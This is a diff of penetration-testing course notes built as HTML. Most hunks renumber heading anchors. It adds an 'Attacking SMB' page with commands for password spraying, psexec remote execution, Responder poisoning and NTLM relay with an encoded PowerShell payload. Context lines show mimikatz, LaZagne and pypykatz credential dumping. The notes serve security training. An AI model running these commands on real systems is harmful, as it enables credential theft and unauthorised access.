-<h2 id="basic-syntax-6"><a class="header" href="#basic-syntax-6">Basic Syntax</a></h2>
+<h2 id="basic-syntax-12"><a class="header" href="#basic-syntax-12">Basic Syntax</a></h2>
 <p>Hydra’s basic syntax is:</p>
 <pre><code class="language-sh">hydra [login_options] [password_options] [attack_options] [service_options] service://server
 </code></pre>
@@ -26460,7 +27425,7 @@ nt authority\system
 <li><strong>Rank Matters</strong>: Higher ranked exploits (excellent, great) are more reliable than lower ranked ones</li>
 </ol>
 <hr>
-<h2 id="best-practices-2"><a class="header" href="#best-practices-2">Best Practices</a></h2>
+<h2 id="best-practices-3"><a class="header" href="#best-practices-3">Best Practices</a></h2>
 <ol>
 <li><strong>Always verify targets</strong> before exploitation</li>
 <li><strong>Use check command</strong> when available to avoid unnecessary exploitation attempts</li>
@@ -27534,7 +28499,7 @@ run -j
 <p>The “jumbo” variant is recommended for penetration testing uses, as it has performance optimizations, additional features such as multilingual word lists, and support for 64-bit architectures. This version is able to crack passwords with greater accuracy and speed.</p>
 <p>Included with JtR are various tools for converting different types of files and hashes into formats that are usable by JtR. Additionally, the software is regularly updated to keep up with the current security trends and technologies.</p>
 <hr>
-<h2 id="installation-5"><a class="header" href="#installation-5">Installation</a></h2>
+<h2 id="installation-6"><a class="header" href="#installation-6">Installation</a></h2>
 <p>John the Ripper often comes pre-installed on penetration testing distributions like Kali Linux. You can verify its presence by running:</p>
 <pre><code class="language-sh">john --help
 </code></pre>
@@ -27546,7 +28511,7 @@ sudo apt-get install john
 <pre><code class="language-sh">sudo apt-get install john-jumbo
 </code></pre>
 <hr>
-<h2 id="basic-syntax-7"><a class="header" href="#basic-syntax-7">Basic Syntax</a></h2>
+<h2 id="basic-syntax-13"><a class="header" href="#basic-syntax-13">Basic Syntax</a></h2>
 <pre><code class="language-sh">john [options] &lt;hash_file&gt;
 </code></pre>
 <hr>
@@ -27581,7 +28546,7 @@ sudo apt-get install john
 <pre><code class="language-sh">john --incremental hashes.txt
 </code></pre>
 <hr>
-<h2 id="common-options-6"><a class="header" href="#common-options-6">Common Options</a></h2>
+<h2 id="common-options-7"><a class="header" href="#common-options-7">Common Options</a></h2>
 <div class="table-wrapper">
 <table>
 <thead>
@@ -27879,7 +28844,7 @@ sudo umount /media/bitlocker
 <li><strong>Cross-Platform</strong>: Works on Linux, macOS, and Windows</li>
 </ul>
 <hr>
-<h2 id="installation-6"><a class="header" href="#installation-6">Installation</a></h2>
+<h2 id="installation-7"><a class="header" href="#installation-7">Installation</a></h2>
 <pre><code class="language-bash"># Via pip
 pip3 install pypykatz
 
@@ -27889,7 +28854,7 @@ cd pypykatz
 pip3 install .
 </code></pre>
 <hr>
-<h2 id="basic-usage-3"><a class="header" href="#basic-usage-3">Basic Usage</a></h2>
+<h2 id="basic-usage-5"><a class="header" href="#basic-usage-5">Basic Usage</a></h2>
 <h3 id="parse-lsass-memory-dump"><a class="header" href="#parse-lsass-memory-dump">Parse LSASS Memory Dump</a></h3>
 <pre><code class="language-bash">pypykatz lsa minidump lsass.dmp
 </code></pre>
@@ -27956,7 +28921,7 @@ pypykatz dpapi prekey password &lt;SID&gt; &lt;password&gt;
 <h3 id="dump-sam-database"><a class="header" href="#dump-sam-database">Dump SAM Database</a></h3>
 <pre><code class="language-bash">pypykatz registry --sam SAM --system SYSTEM
 </code></pre>
-<h3 id="dump-lsa-secrets"><a class="header" href="#dump-lsa-secrets">Dump LSA Secrets</a></h3>
+<h3 id="dump-lsa-secrets-1"><a class="header" href="#dump-lsa-secrets-1">Dump LSA Secrets</a></h3>
 <pre><code class="language-bash">pypykatz registry --security SECURITY --system SYSTEM
 </code></pre>
 <h3 id="dump-cached-domain-credentials"><a class="header" href="#dump-cached-domain-credentials">Dump Cached Domain Credentials</a></h3>
@@ -28094,7 +29059,7 @@ NTLM: aad3b435b51404eeaad3b435b51404ee
 <li><strong>Memory Extraction</strong>: Some modules extract from process memory</li>
 </ul>
 <hr>
-<h2 id="installation-7"><a class="header" href="#installation-7">Installation</a></h2>
+<h2 id="installation-8"><a class="header" href="#installation-8">Installation</a></h2>
 <h3 id="windows"><a class="header" href="#windows">Windows</a></h3>
 <pre><code class="language-powershell"># Download standalone executable
 https://github.com/AlessandroZ/LaZagne/releases
@@ -28112,7 +29077,7 @@ pip3 install -r requirements.txt
 python3 laZagne.py all
 </code></pre>
 <hr>
-<h2 id="basic-usage-4"><a class="header" href="#basic-usage-4">Basic Usage</a></h2>
+<h2 id="basic-usage-6"><a class="header" href="#basic-usage-6">Basic Usage</a></h2>
 <h3 id="extract-all-credentials"><a class="header" href="#extract-all-credentials">Extract All Credentials</a></h3>
 <pre><code class="language-bash"># Windows
 laZagne.exe all
@@ -28129,7 +29094,7 @@ laZagne.exe all -oJ          # JSON output
 laZagne.exe all -oA          # All formats
 </code></pre>
 <hr>
-<h2 id="modules-2"><a class="header" href="#modules-2">Modules</a></h2>
+<h2 id="modules-3"><a class="header" href="#modules-3">Modules</a></h2>
 <h3 id="list-available-modules"><a class="header" href="#list-available-modules">List Available Modules</a></h3>
 <pre><code class="language-bash">laZagne.exe -h
 </code></pre>
@@ -28390,7 +29355,7 @@ type C:\Temp\credentials.json
 </ul>
 <p>Unshadow merges these files so that password crackers have access to both the hash and the user context (username, real name from GECOS field) in a single file.</p>
 <hr>
-<h2 id="installation-8"><a class="header" href="#installation-8">Installation</a></h2>
+<h2 id="installation-9"><a class="header" href="#installation-9">Installation</a></h2>
 <p>Unshadow comes bundled with John the Ripper. On Debian-based systems:</p>
 <pre><code class="language-sh">sudo apt-get install john
 </code></pre>
@@ -28398,7 +29363,7 @@ type C:\Temp\credentials.json
 <pre><code class="language-sh">which unshadow
 </code></pre>
 <hr>
-<h2 id="basic-syntax-8"><a class="header" href="#basic-syntax-8">Basic Syntax</a></h2>
+<h2 id="basic-syntax-14"><a class="header" href="#basic-syntax-14">Basic Syntax</a></h2>
 <pre><code class="language-sh">unshadow &lt;passwd_file&gt; &lt;shadow_file&gt; &gt; &lt;output_file&gt;
 </code></pre>
 <hr>
@@ -28490,13 +29455,13 @@ sudo cp /etc/shadow /tmp/shadow.bak
 <li><strong>PKINIT</strong>: Request TGTs using X.509 certificates (Pass-the-Certificate)</li>
 </ul>
 <hr>
-<h2 id="installation-9"><a class="header" href="#installation-9">Installation</a></h2>
+<h2 id="installation-10"><a class="header" href="#installation-10">Installation</a></h2>
 <p>Rubeus is not installed via package managers. Compile from source or download pre-compiled:</p>
 <pre><code>https://github.com/GhostPack/Rubeus
 </code></pre>
 <p>Compile with Visual Studio or use pre-compiled versions from various pentesting resources.</p>
 <hr>
-<h2 id="basic-usage-5"><a class="header" href="#basic-usage-5">Basic Usage</a></h2>
+<h2 id="basic-usage-7"><a class="header" href="#basic-usage-7">Basic Usage</a></h2>
 <h3 id="dump-all-tickets-1"><a class="header" href="#dump-all-tickets-1">Dump All Tickets</a></h3>
 <pre><code class="language-cmd">Rubeus.exe dump /nowrap
 </code></pre>
@@ -28651,7 +29616,7 @@ des_cbc_md5          : ...
 <pre><code class="language-cmd">Rubeus.exe monitor /interval:5 /filteruser:Administrator
 </code></pre>
 <hr>
-<h2 id="common-options-7"><a class="header" href="#common-options-7">Common Options</a></h2>
+<h2 id="common-options-8"><a class="header" href="#common-options-8">Common Options</a></h2>
 <div class="table-wrapper">
 <table>
 <thead>
@@ -28731,7 +29696,7 @@ des_cbc_md5          : ...
 <li><strong>DCSync</strong>: Replicate credentials from Domain Controllers</li>
 </ul>
 <hr>
-<h2 id="installation-10"><a class="header" href="#installation-10">Installation</a></h2>
+<h2 id="installation-11"><a class="header" href="#installation-11">Installation</a></h2>
 <p>Mimikatz is not installed via package managers. Download from the official repository:</p>
 <pre><code>https://github.com/gentilkiwi/mimikatz/releases
 </code></pre>
@@ -28741,7 +29706,7 @@ des_cbc_md5          : ...
 <li><strong>pypykatz</strong>: Python implementation (cross-platform)</li>
 </ul>
 <hr>
-<h2 id="basic-usage-6"><a class="header" href="#basic-usage-6">Basic Usage</a></h2>
+<h2 id="basic-usage-8"><a class="header" href="#basic-usage-8">Basic Usage</a></h2>
 <h3 id="enable-debug-privileges"><a class="header" href="#enable-debug-privileges">Enable Debug Privileges</a></h3>
 <pre><code>privilege::debug
 </code></pre>
@@ -28787,7 +29752,7 @@ des_cbc_md5          : ...
 <h3 id="dump-kerberos-tickets"><a class="header" href="#dump-kerberos-tickets">Dump Kerberos Tickets</a></h3>
 <pre><code>sekurlsa::tickets
 </code></pre>
-<h3 id="pass-the-hash-2"><a class="header" href="#pass-the-hash-2">Pass-the-Hash</a></h3>
+<h3 id="pass-the-hash-5"><a class="header" href="#pass-the-hash-5">Pass-the-Hash</a></h3>
 <pre><code>sekurlsa::pth /user:Administrator /domain:DOMAIN /ntlm:&lt;hash&gt; /run:cmd
 </code></pre>
 <h3 id="dump-kerberos-encryption-keys"><a class="header" href="#dump-kerberos-encryption-keys">Dump Kerberos Encryption Keys</a></h3>
@@ -28833,7 +29798,7 @@ crypto::cng
 <h3 id="dump-sam-database-1"><a class="header" href="#dump-sam-database-1">Dump SAM Database</a></h3>
 <pre><code>lsadump::sam
 </code></pre>
-<h3 id="dump-lsa-secrets-1"><a class="header" href="#dump-lsa-secrets-1">Dump LSA Secrets</a></h3>
+<h3 id="dump-lsa-secrets-2"><a class="header" href="#dump-lsa-secrets-2">Dump LSA Secrets</a></h3>
 <pre><code>lsadump::secrets
 </code></pre>
 <h3 id="dump-cached-domain-credentials-1"><a class="header" href="#dump-cached-domain-credentials-1">Dump Cached Domain Credentials</a></h3>
@@ -28937,7 +29902,7 @@ vault::cred
 <li>Consider offline analysis to avoid detection</li>
 </ul>
 <div style="break-before: page; page-break-before: always;"></div>
-<h1 id="troubleshooting-2"><a class="header" href="#troubleshooting-2">Troubleshooting</a></h1>
+<h1 id="troubleshooting-3"><a class="header" href="#troubleshooting-3">Troubleshooting</a></h1>
 <h2 id="directory-map-29"><a class="header" href="#directory-map-29">Directory Map</a></h2>
 <ul>
 <li><a href="troubleshooting/linux">linux</a></li>
@@ -29414,7 +30379,8 @@ ac
 <h2 id="directory-map-33"><a class="header" href="#directory-map-33">Directory Map</a></h2>
 <h3 id="generic"><a class="header" href="#generic">Generic</a></h3>
 <ul>
-<li><a href="#enumeration-1">enumeration</a></li>
+<li><a href="#attacking-smb">attacking-smb</a></li>
+<li><a href="#enumeration-2">enumeration</a></li>
 <li><a href="#crawling">crawling</a></li>
 <li><a href="infosec/robots-text.html">robots-text</a></li>
 <li><a href="#shell-harnesses">shell-harnesses</a></li>
@@ -29450,6 +30416,182 @@ ac
 <h3 id="linux-1"><a class="header" href="#linux-1">Linux</a></h3>
 <ul>
 <li><a href="#linux-authentication">linux-auth</a></li>
+</ul>
+<div style="break-before: page; page-break-before: always;"></div>
+<h1 id="attacking-smb"><a class="header" href="#attacking-smb">Attacking SMB</a></h1>
+<h2 id="overview-12"><a class="header" href="#overview-12">Overview</a></h2>
+<ul>
+<li>Server Message Block (SMB) is a communication protocol for providing shared access to files and printers across nodes on a network.</li>
+<li>Originally designed to run on top of NetBIOS over TCP/IP (NBT) using TCP port 139 and UDP ports 137 and 138.</li>
+<li>Windows 2000+ can run SMB directly over TCP/IP on port 445 without the NetBIOS layer.</li>
+<li>Modern Windows uses SMB over TCP but supports NetBIOS as a failover.</li>
+<li>Samba is a Unix/Linux open-source implementation of SMB, allowing Linux/Unix servers and Windows clients to use the same SMB services.</li>
+</ul>
+<h2 id="port-summary"><a class="header" href="#port-summary">Port Summary</a></h2>
+<div class="table-wrapper">
+<table>
+<thead>
+<tr><th>Port</th><th>Protocol</th><th>Description</th></tr>
+</thead>
+<tbody>
+<tr><td>139/TCP</td><td>NetBIOS-SSN</td><td>SMB over NetBIOS</td></tr>
+<tr><td>445/TCP</td><td>Microsoft-DS</td><td>SMB over TCP/IP</td></tr>
+<tr><td>137/UDP</td><td>NetBIOS-NS</td><td>NetBIOS Name Service</td></tr>
+<tr><td>138/UDP</td><td>NetBIOS-DGM</td><td>NetBIOS Datagram</td></tr>
+</tbody>
+</table>
+</div>
+<h2 id="related-protocols"><a class="header" href="#related-protocols">Related Protocols</a></h2>
+<ul>
+<li><strong>MSRPC (Microsoft Remote Procedure Call)</strong>: Provides a generic way to execute procedures in local or remote processes. RPC over SMB can use named pipes as its underlying transport.</li>
+</ul>
+<h2 id="enumeration-1"><a class="header" href="#enumeration-1">Enumeration</a></h2>
+<h3 id="nmap-scanning"><a class="header" href="#nmap-scanning">Nmap Scanning</a></h3>
+<pre><code class="language-bash">sudo nmap 10.129.14.128 -sV -sC -p139,445
+</code></pre>
+<p>Key information from scans:</p>
+<ul>
+<li>SMB version (e.g., Samba smbd 4.6.2)</li>
+<li>Hostname</li>
+<li>Operating system (inferred from SMB implementation)</li>
+<li>Message signing status</li>
+</ul>
+<h2 id="misconfigurations"><a class="header" href="#misconfigurations">Misconfigurations</a></h2>
+<h3 id="null-session--anonymous-authentication"><a class="header" href="#null-session--anonymous-authentication">Null Session / Anonymous Authentication</a></h3>
+<ul>
+<li>SMB can be configured to not require authentication.</li>
+<li>Allows access to shares, usernames, groups, permissions, policies, and services without credentials.</li>
+</ul>
+<p>Tools supporting null session:</p>
+<ul>
+<li><code>smbclient</code></li>
+<li><code>smbmap</code></li>
+<li><code>rpcclient</code></li>
+<li><code>enum4linux</code></li>
+</ul>
+<h3 id="listing-shares-with-smbclient"><a class="header" href="#listing-shares-with-smbclient">Listing Shares with smbclient</a></h3>
+<pre><code class="language-bash">smbclient -L //10.10.11.45 -N
+</code></pre>
+<ul>
+<li><code>-L</code>: List shares</li>
+<li><code>-N</code>: Use null session (no password)</li>
+</ul>
+<h2 id="protocol-specific-attacks"><a class="header" href="#protocol-specific-attacks">Protocol-Specific Attacks</a></h2>
+<h3 id="brute-forcing-vs-password-spraying"><a class="header" href="#brute-forcing-vs-password-spraying">Brute Forcing vs Password Spraying</a></h3>
+<ul>
+<li><strong>Brute Forcing</strong>: Try many passwords against one account. Risk of lockout.</li>
+<li><strong>Password Spraying</strong>: Try one password against many accounts. Safer approach.</li>
+<li>Recommended: 2-3 attempts with 30-60 minute waits between attempts.</li>
+</ul>
+<h3 id="password-spraying-with-crackmapexec"><a class="header" href="#password-spraying-with-crackmapexec">Password Spraying with CrackMapExec</a></h3>
+<pre><code class="language-bash">crackmapexec smb 10.10.110.17 -u /tmp/userlist.txt -p 'Company01!' --local-auth
+</code></pre>
+<p>Flags:</p>
+<ul>
+<li><code>--continue-on-success</code>: Continue spraying after valid login found</li>
+<li><code>--local-auth</code>: Required for non-domain joined computers</li>
+</ul>
+<h2 id="windows-smb-attack-capabilities"><a class="header" href="#windows-smb-attack-capabilities">Windows SMB Attack Capabilities</a></h2>
+<p>With admin or privileged access:</p>
+<ul>
+<li>Remote Command Execution</li>
+<li>Extract Hashes from SAM Database</li>
+<li>Enumerate Logged-on Users</li>
+<li>Pass-the-Hash (PTH)</li>
+</ul>
+<h2 id="remote-code-execution-rce"><a class="header" href="#remote-code-execution-rce">Remote Code Execution (RCE)</a></h2>
+<h3 id="psexec"><a class="header" href="#psexec">PsExec</a></h3>
+<ul>
+<li>Executes processes on remote systems with full console interactivity.</li>
+<li>Deploys a Windows service to admin$ share on the remote machine.</li>
+<li>Uses DCE/RPC interface over SMB to access Windows Service Control Manager API.</li>
+</ul>
+<h3 id="impacket-tools"><a class="header" href="#impacket-tools">Impacket Tools</a></h3>
+<ul>
+<li><strong>impacket-psexec</strong>: Python PsExec using RemComSvc</li>
+<li><strong>impacket-smbexec</strong>: Similar to PsExec without RemComSvc, uses local SMB server for output</li>
+<li><strong>impacket-atexec</strong>: Executes commands through Task Scheduler service</li>
+</ul>
+<h3 id="using-impacket-psexec"><a class="header" href="#using-impacket-psexec">Using impacket-psexec</a></h3>
+<pre><code class="language-bash">impacket-psexec administrator:'Password123!'@10.10.110.17
+</code></pre>
+<h3 id="crackmapexec-command-execution"><a class="header" href="#crackmapexec-command-execution">CrackMapExec Command Execution</a></h3>
+<pre><code class="language-bash"># CMD command
+crackmapexec smb 10.10.110.17 -u Administrator -p 'Password123!' -x 'whoami' --exec-method smbexec
+
+# PowerShell command
+crackmapexec smb 10.10.110.17 -u Administrator -p 'Password123!' -X 'Get-Process'
+</code></pre>
+<p>Note: If <code>--exec-method</code> is not defined, CME tries <code>atexec</code> first, then <code>smbexec</code>.</p>
+<h2 id="enumerating-logged-on-users"><a class="header" href="#enumerating-logged-on-users">Enumerating Logged-on Users</a></h2>
+<pre><code class="language-bash">crackmapexec smb 10.10.110.0/24 -u administrator -p 'Password123!' --loggedon-users
+</code></pre>
+<h2 id="credential-capture-with-responder"><a class="header" href="#credential-capture-with-responder">Credential Capture with Responder</a></h2>
+<h3 id="llmnrnbt-ns-poisoning"><a class="header" href="#llmnrnbt-ns-poisoning">LLMNR/NBT-NS Poisoning</a></h3>
+<p>When a host can’t resolve a name through DNS, it falls back to:</p>
+<ol>
+<li>Local hosts file</li>
+<li>Local DNS cache</li>
+<li>Configured DNS server</li>
+<li>Multicast query (LLMNR/NBT-NS)</li>
+</ol>
+<p>Attackers can poison these multicast queries to capture credentials.</p>
+<h3 id="running-responder"><a class="header" href="#running-responder">Running Responder</a></h3>
+<pre><code class="language-bash">sudo responder -I ens33
+</code></pre>
+<p>Responder can poison:</p>
+<ul>
+<li>LLMNR</li>
+<li>NBT-NS</li>
+<li>DNS/MDNS</li>
+</ul>
+<h2 id="ntlm-relay-attacks"><a class="header" href="#ntlm-relay-attacks">NTLM Relay Attacks</a></h2>
+<h3 id="using-impacket-ntlmrelayx"><a class="header" href="#using-impacket-ntlmrelayx">Using impacket-ntlmrelayx</a></h3>
+<pre><code class="language-bash"># Dump SAM database
+impacket-ntlmrelayx --no-http-server -smb2support -t 10.10.110.146
+
+# Execute command
+impacket-ntlmrelayx --no-http-server -smb2support -t 192.168.220.146 -c 'powershell -e &lt;BASE64_PAYLOAD&gt;'
+</code></pre>
+<p>Use https://www.revshells.com/ to generate reverse shell payloads.</p>
+<h2 id="rpc-attacks"><a class="header" href="#rpc-attacks">RPC Attacks</a></h2>
+<p>Beyond enumeration, RPC can be used to:</p>
+<ul>
+<li>Change user passwords</li>
+<li>Create new domain users</li>
+<li>Create new shared folders</li>
+</ul>
+<p>Tools:</p>
+<ul>
+<li><code>rpcclient</code></li>
+</ul>
+<h2 id="tools-summary"><a class="header" href="#tools-summary">Tools Summary</a></h2>
+<div class="table-wrapper">
+<table>
+<thead>
+<tr><th>Tool</th><th>Purpose</th></tr>
+</thead>
+<tbody>
+<tr><td>nmap</td><td>Port scanning and service enumeration</td></tr>
+<tr><td>smbclient</td><td>SMB share interaction</td></tr>
+<tr><td>smbmap</td><td>SMB share enumeration</td></tr>
+<tr><td>enum4linux</td><td>SMB enumeration</td></tr>
+<tr><td>rpcclient</td><td>RPC enumeration and interaction</td></tr>
+<tr><td>crackmapexec</td><td>Password spraying, command execution, enumeration</td></tr>
+<tr><td>impacket-psexec</td><td>Remote command execution</td></tr>
+<tr><td>impacket-smbexec</td><td>Remote command execution</td></tr>
+<tr><td>impacket-atexec</td><td>Remote command execution via Task Scheduler</td></tr>
+<tr><td>responder</td><td>LLMNR/NBT-NS poisoning</td></tr>
+<tr><td>impacket-ntlmrelayx</td><td>NTLM relay attacks</td></tr>
+</tbody>
+</table>
+</div>
+<h2 id="references-2"><a class="header" href="#references-2">References</a></h2>
+<ul>
+<li><a href="https://github.com/byt3bl33d3r/CrackMapExec">CrackMapExec Documentation</a></li>
+<li><a href="https://github.com/SecureAuthCorp/impacket">Impacket</a></li>
+<li><a href="https://github.com/lgandx/Responder">Responder</a></li>
+<li><a href="https://www.sans.org">SANS SMB Access from Linux Cheat Sheet</a></li>
 </ul>
 <div style="break-before: page; page-break-before: always;"></div>
 <h1 id="cracking-protected-files-and-archives"><a class="header" href="#cracking-protected-files-and-archives">Cracking Protected Files and Archives</a></h1>
@@ -29753,7 +30895,7 @@ sudo umount /media/bitlocker
 <p>Each method has its advantages and disadvantages depending on the use case.</p>
 <div style="break-before: page; page-break-before: always;"></div>
 <h1 id="robotstxt"><a class="header" href="#robotstxt">robots.txt</a></h1>
-<h2 id="overview-12"><a class="header" href="#overview-12">Overview</a></h2>
+<h2 id="overview-13"><a class="header" href="#overview-13">Overview</a></h2>
 <p>Imagine you’re a guest at a grand house party. While you’re free to mingle and explore, there might be certain rooms marked “Private” that you’re expected to avoid. This is akin to how <code>robots.txt</code> functions in the world of web crawling. It acts as a virtual “etiquette guide” for bots, outlining which areas of a website they are allowed to access and which are off-limits.</p>
 <h2 id="what-is-robotstxt"><a class="header" href="#what-is-robotstxt">What is robots.txt?</a></h2>
 <p>Technically, <code>robots.txt</code> is a simple text file placed in the root directory of a website (e.g., <code>www.example.com/robots.txt</code>). It adheres to the Robots Exclusion Standard, guidelines for how web crawlers should behave when visiting a website. This file contains instructions in the form of “directives” that tell bots which parts of the website they can and cannot crawl.</p>
@@ -29905,7 +31047,7 @@ find . -exec /bin/sh \; -quit
 </code></pre>
 <div style="break-before: page; page-break-before: always;"></div>
 <h1 id="well-known-uris"><a class="header" href="#well-known-uris">Well-Known URIs</a></h1>
-<h2 id="overview-13"><a class="header" href="#overview-13">Overview</a></h2>
+<h2 id="overview-14"><a class="header" href="#overview-14">Overview</a></h2>
 <p>The <code>.well-known</code> standard, defined in RFC 8615, serves as a standardized directory within a website’s root domain. This designated location, typically accessible via the <code>/.well-known/</code> path on a web server, centralizes a website’s critical metadata, including configuration files and information related to its services, protocols, and security mechanisms.</p>
 <p>By establishing a consistent location for such data, <code>.well-known</code> simplifies the discovery and access process for various stakeholders, including web browsers, applications, and security tools. This streamlined approach enables clients to automatically locate and retrieve specific configuration files by constructing the appropriate URL. For instance, to access a website’s security policy, a client would request <code>https://example.com/.well-known/security.txt</code>.</p>
 <p>The Internet Assigned Numbers Authority (IANA) maintains a registry of <code>.well-known</code> URIs, each serving a specific purpose defined by various specifications and standards.</p>
@@ -29958,7 +31100,7 @@ find . -exec /bin/sh \; -quit
 <h2 id="reconnaissance-strategy"><a class="header" href="#reconnaissance-strategy">Reconnaissance Strategy</a></h2>
 <p>Exploring the IANA Registry and experimenting with the various <code>.well-known</code> URIs is an invaluable approach to uncovering additional web reconnaissance opportunities. As demonstrated with the <code>openid-configuration</code> endpoint above, these standardized URIs provide structured access to critical metadata and configuration details, enabling security professionals to comprehensively map out a website’s security landscape.</p>
 <div style="break-before: page; page-break-before: always;"></div>
-<h1 id="enumeration-1"><a class="header" href="#enumeration-1">Enumeration</a></h1>
+<h1 id="enumeration-2"><a class="header" href="#enumeration-2">Enumeration</a></h1>
 <h2 id="principles-of-enumeration"><a class="header" href="#principles-of-enumeration">Principles of Enumeration</a></h2>
 <ul>
 <li>Enumeration is the systematic process of gathering information about a target system or network to identify potential vulnerabilities and entry points. There are two methods of enumeration: active and passive.</li>
@@ -30599,7 +31741,7 @@ Thus using an <strong>ACK scan</strong> (-sA) might be a good idea because the f
 <pre><code>nc -nv --source-port 53 10.129.2.28 50000
 </code></pre>
 <hr>
-<h2 id="references-2"><a class="header" href="#references-2">References</a></h2>
+<h2 id="references-3"><a class="header" href="#references-3">References</a></h2>
 <ul>
 <li><a href="https://nmap.org/book/man-port-scanning-techniques.html">Nmap scan types</a></li>
 <li><a href="https://www.nmap.org">nmap docs</a></li>
@@ -30788,7 +31930,7 @@ Authorization: Basic YWxpY2U6c2VjcmV0MTIz
 </ul>
 <div style="break-before: page; page-break-before: always;"></div>
 <h1 id="laudanum"><a class="header" href="#laudanum">Laudanum</a></h1>
-<h2 id="overview-14"><a class="header" href="#overview-14">Overview</a></h2>
+<h2 id="overview-15"><a class="header" href="#overview-15">Overview</a></h2>
 <p>Laudanum is a repository of ready-made files that can be used to inject onto a victim and receive back access via a reverse shell. It is designed to be easy to use and customizable for different scenarios.</p>
 <p>Laudanum can be downloaded here: https://github.com/jbarcia/Web-Shells/tree/master/laudanum</p>
 <h2 id="using-laudanum"><a class="header" href="#using-laudanum">Using Laudanum</a></h2>
@@ -31234,14 +32376,14 @@ SMB         10.129.42.198   445    WS01     [+] Added 8 SAM hashes to the databa
 <pre><code class="language-bash">$ pypykatz lsa minidump lsass.dmp
 </code></pre>
 <p><code>pypykatz</code> will parse the dump and extract any credentials it finds, displaying them in a readable format. We can then use <code>hashcat</code> to attempt to crack any NTLM hashes.</p>
-<h3 id="references-3"><a class="header" href="#references-3">References</a></h3>
+<h3 id="references-4"><a class="header" href="#references-4">References</a></h3>
 <p>hettps://learn.microsoft.com/en-us/previous-versions/windows/it-pro/windows-2000-server/cc961760(v=technet.10)?redirectedfrom=MSDN
 https://learn.microsoft.com/en-us/windows-server/security/windows-authentication/credentials-processes-in-windows-authentication
 https://www.microsoft.com/en-us/msrc/blog/2014/06/an-overview-of-kb2871997
 https://learn.microsoft.com/en-us/windows/win32/secauthn/msv1-0-authentication-package</p>
 <div style="break-before: page; page-break-before: always;"></div>
 <h1 id="attacking-windows-credential-manager"><a class="header" href="#attacking-windows-credential-manager">Attacking Windows Credential Manager</a></h1>
-<h2 id="overview-15"><a class="header" href="#overview-15">Overview</a></h2>
+<h2 id="overview-16"><a class="header" href="#overview-16">Overview</a></h2>
 <p>Windows Credential Manager is a built-in feature (since Server 2008 R2 / Windows 7) that allows users and applications to securely store credentials for other systems and websites. Credentials are stored in encrypted folders protected by DPAPI.</p>
 <h2 id="credential-storage-locations-1"><a class="header" href="#credential-storage-locations-1">Credential Storage Locations</a></h2>
 <div class="table-wrapper">
@@ -31765,7 +32907,7 @@ Info: Establishing connection to remote endpoint
 <li>Monitor for PtH indicators (e.g., NTLM authentication events, unusual logon patterns)</li>
 <li>Regularly rotate privileged account passwords</li>
 </ul>
-<h2 id="references-4"><a class="header" href="#references-4">References</a></h2>
+<h2 id="references-5"><a class="header" href="#references-5">References</a></h2>
 <ul>
 <li><a href="https://github.com/gentilkiwi/mimikatz">Mimikatz Documentation</a></li>
 <li><a href="https://github.com/Kevin-Robertson/Invoke-TheHash">Invoke-TheHash</a></li>
@@ -32330,7 +33472,7 @@ Default principal: julio@INLANEFREIGHT.HTB
 <li>Use short-lived tickets and enforce ticket renewal</li>
 </ul>
 <hr>
-<h2 id="references-5"><a class="header" href="#references-5">References</a></h2>
+<h2 id="references-6"><a class="header" href="#references-6">References</a></h2>
 <ul>
 <li><a href="https://github.com/gentilkiwi/mimikatz">Mimikatz Documentation</a></li>
 <li><a href="https://github.com/GhostPack/Rubeus">Rubeus</a></li>
@@ -32402,7 +33544,7 @@ RPRN SessionError: code: 0x6ba - RPC_S_SERVER_UNAVAILABLE - The RPC server is un
 <hr>
 <h2 id="obtaining-a-tgt-with-pkinit"><a class="header" href="#obtaining-a-tgt-with-pkinit">Obtaining a TGT with PKINIT</a></h2>
 <h3 id="using-gettgtpkinitpy-pkinittools"><a class="header" href="#using-gettgtpkinitpy-pkinittools">Using gettgtpkinit.py (PKINITtools)</a></h3>
-<h4 id="installation-11"><a class="header" href="#installation-11">Installation</a></h4>
+<h4 id="installation-12"><a class="header" href="#installation-12">Installation</a></h4>
 <pre><code class="language-bash">$ git clone https://github.com/dirkjanm/PKINITtools.git &amp;&amp; cd PKINITtools
 $ python3 -m venv .venv
 $ source .venv/bin/activate
@@ -32559,7 +33701,7 @@ Administrator:500:aad3b435b51404eeaad3b435b51404ee:...SNIP...:::
 <li>Enable Credential Guard to protect against ticket theft</li>
 </ul>
 <hr>
-<h2 id="references-6"><a class="header" href="#references-6">References</a></h2>
+<h2 id="references-7"><a class="header" href="#references-7">References</a></h2>
 <ul>
 <li><a href="https://specterops.io/wp-content/uploads/sites/3/2022/06/Certified_Pre-Owned.pdf">Certified Pre-Owned - SpecterOps</a></li>
 <li><a href="https://github.com/dirkjanm/PKINITtools">PKINITtools</a></li>
@@ -32793,7 +33935,7 @@ Administrator:500:aad3b435b51404eeaad3b435b51404ee:...SNIP...:::
 </table>
 </div>
 <hr>
-<h2 id="references-7"><a class="header" href="#references-7">References</a></h2>
+<h2 id="references-8"><a class="header" href="#references-8">References</a></h2>
 <ul>
 <li><a href="https://docs.microsoft.com/en-us/windows/security/threat-protection/auditing/basic-audit-logon-events">Microsoft Docs - Audit Logon Events</a></li>
 <li><a href="https://docs.microsoft.com/en-us/windows/security/threat-protection/auditing/event-4624">Event ID 4624 - An account was successfully logged on</a></li>
